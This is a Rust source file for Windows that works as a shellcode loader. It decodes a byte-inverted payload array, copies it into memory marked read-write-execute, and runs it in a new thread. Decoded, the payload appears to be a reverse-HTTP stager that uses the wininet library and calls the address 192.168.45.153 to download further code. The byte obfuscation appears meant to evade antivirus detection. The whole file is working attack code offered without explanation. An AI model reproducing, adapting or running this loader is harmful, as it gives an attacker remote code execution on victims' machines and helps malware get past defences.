use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;
use std::mem::transmute;

fn main() {
    unsafe {
        let mut buf: [u8; 589] =[0x3,0xb7,0x7c,0x1b,0xf,0x17,0x33,0xff,0xff,0xff,0xbe,0xae,0xbe,0xaf,0xad,0xae,0xb7,0xce,0x2d,0x9a,0xb7,0x74,0xad,0x9f,0xb7,0x74,0xad,0xe7,0xb7,0x74,0xad,0xdf,0xa9,0xb7,0xf0,0x48,0xb5,0xb5,0xb2,0xce,0x36,0xb7,0x74,0x8d,0xaf,0xb7,0xce,0x3f,0x53,0xc3,0x9e,0x83,0xfd,0xd3,0xdf,0xbe,0x3e,0x36,0xf2,0xbe,0xfe,0x3e,0x1d,0x12,0xad,0xb7,0x74,0xad,0xdf,0x74,0xbd,0xc3,0xb7,0xfe,0x2f,0xbe,0xae,0x99,0x7e,0x87,0xe7,0xf4,0xfd,0xf0,0x7a,0x8d,0xff,0xff,0xff,0x74,0x7f,0x77,0xff,0xff,0xff,0xb7,0x7a,0x3f,0x8b,0x98,0xb7,0xfe,0x2f,0xbb,0x74,0xbf,0xdf,0xaf,0xb6,0xfe,0x2f,0x74,0xb7,0xe7,0x1c,0xa9,0xb7,0x0,0x36,0xbe,0x74,0xcb,0x77,0xb7,0xfe,0x29,0xb2,0xce,0x36,0xb7,0xce,0x3f,0xbe,0x3e,0x36,0xf2,0x53,0xbe,0xfe,0x3e,0xc7,0x1f,0x8a,0xe,0xb3,0xfc,0xb3,0xdb,0xf7,0xba,0xc6,0x2e,0x8a,0x27,0xa7,0xbb,0x74,0xbf,0xdb,0xb6,0xfe,0x2f,0x99,0xbe,0x74,0xf3,0xb7,0xbb,0x74,0xbf,0xe3,0xb6,0xfe,0x2f,0xbe,0x74,0xfb,0x77,0xb7,0xfe,0x2f,0xbe,0xa7,0xbe,0xa7,0xa1,0xa6,0xa5,0xbe,0xa7,0xbe,0xa6,0xbe,0xa5,0xb7,0x7c,0x13,0xdf,0xbe,0xad,0x0,0x1f,0xa7,0xbe,0xa6,0xa5,0xb7,0x74,0xed,0x16,0xb4,0x0,0x0,0x0,0xa2,0xb7,0xce,0x24,0xac,0xb6,0x41,0x88,0x96,0x91,0x96,0x91,0x9a,0x8b,0xff,0xbe,0xa9,0xb7,0x76,0x1e,0xb6,0x38,0x3d,0xb3,0x88,0xd9,0xf8,0x0,0x2a,0xac,0xac,0xb7,0x76,0x1e,0xac,0xa5,0xb2,0xce,0x3f,0xb2,0xce,0x36,0xac,0xac,0xb6,0x45,0xc5,0xa9,0x86,0x58,0xff,0xff,0xff,0xff,0x0,0x2a,0x17,0xf0,0xff,0xff,0xff,0xce,0xc6,0xcd,0xd1,0xce,0xc9,0xc7,0xd1,0xcb,0xca,0xd1,0xce,0xca,0xcc,0xff,0xa5,0xb7,0x76,0x3e,0xb6,0x38,0x3f,0x44,0xfe,0xff,0xff,0xb2,0xce,0x36,0xac,0xac,0x95,0xfc,0xac,0xb6,0x45,0xa8,0x76,0x60,0x39,0xff,0xff,0xff,0xff,0x0,0x2a,0x17,0xdd,0xff,0xff,0xff,0xd0,0xa8,0xbc,0x85,0x8d,0xa5,0xc8,0xa5,0xce,0x9c,0xad,0xbb,0xac,0xc9,0xb1,0xaf,0x8e,0x8b,0xb1,0x8b,0xbd,0xc7,0x88,0xba,0xb4,0xb5,0xb9,0xc8,0xa7,0xa6,0x98,0xcb,0xa0,0xff,0xb7,0x76,0x3e,0xac,0xa5,0xbe,0xa7,0xb2,0xce,0x36,0xac,0xb7,0x47,0xff,0xcd,0x57,0x7b,0xff,0xff,0xff,0xff,0xaf,0xac,0xac,0xb6,0x38,0x3d,0x14,0xaa,0xd1,0xc4,0x0,0x2a,0xb7,0x76,0x39,0x95,0xf5,0xa0,0xb7,0x76,0xe,0x95,0xe0,0xa5,0xad,0x97,0x7f,0xcc,0xff,0xff,0xb6,0x76,0x1f,0x95,0xfb,0xbe,0xa6,0xb6,0x45,0x8a,0xb9,0x61,0x79,0xff,0xff,0xff,0xff,0x0,0x2a,0xb2,0xce,0x3f,0xac,0xa5,0xb7,0x76,0xe,0xb2,0xce,0x36,0xb2,0xce,0x36,0xac,0xac,0xb6,0x38,0x3d,0xd2,0xf9,0xe7,0x84,0x0,0x2a,0x7a,0x3f,0x8a,0xe0,0xb7,0x38,0x3e,0x77,0xec,0xff,0xff,0xb6,0x45,0xbb,0xf,0xca,0x1f,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x0,0x30,0x8b,0xfd,0x14,0x55,0x17,0xaa,0xff,0xff,0xff,0xac,0xa6,0x95,0xbf,0xa5,0xb6,0x76,0x2e,0x3e,0x1d,0xef,0xb6,0x38,0x3f,0xff,0xef,0xff,0xff,0xb6,0x45,0xa7,0x5b,0xac,0x1a,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x6c,0xac,0xac,0xb7,0x76,0x18,0xb7,0x76,0xe,0xb7,0x76,0x25,0xb6,0x38,0x3f,0xff,0xdf,0xff,0xff,0xb6,0x76,0x6,0xb6,0x45,0xed,0x69,0x76,0x1d,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x7c,0x3b,0xdf,0x7a,0x3f,0x8b,0x4d,0x99,0x74,0xf8,0xb7,0xfe,0x3c,0x7a,0x3f,0x8a,0x2d,0xa7,0x3c,0xa7,0x95,0xff,0xa6,0x44,0x1f,0xe2,0xd5,0xf5,0xbe,0x76,0x25,0x0,0x2a];
        
        for i in 0..buf.len() {
            buf[i] = 0xFF - buf[i];
        }
        //buf.reverse();

        let size = buf.len();

        let addr = VirtualAlloc(
            null_mut(),
            0x4000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;

        if addr.is_null() {
            panic!("VirtualAlloc failed");
        }

        std::ptr::copy_nonoverlapping(buf.as_ptr(), addr, size);

        let thread_start: unsafe extern "system" 
            fn(*mut winapi::ctypes::c_void) -> u32 = 
                transmute(addr as *mut winapi::ctypes::c_void);

        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(transmute(thread_start)),
            null_mut(),
            0,
            null_mut(),
        );

        if h_thread.is_null() {
            panic!("CreateThread failed");
        }

        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}